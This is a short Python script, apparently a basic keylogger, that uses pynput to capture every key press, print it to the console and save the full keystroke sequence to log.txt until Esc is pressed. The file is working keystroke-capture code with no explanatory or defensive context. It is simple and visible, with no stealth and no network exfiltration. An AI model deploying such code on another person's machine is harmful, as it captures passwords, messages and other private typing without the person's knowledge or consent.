import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)
    
    try:
        print('Alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special key {0} pressed'.format(key))

def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            k = str(key).replace("'", "")
            # Handling special keys
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(k)
            else:
                f.write(' [' + k + '] ')
        
def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()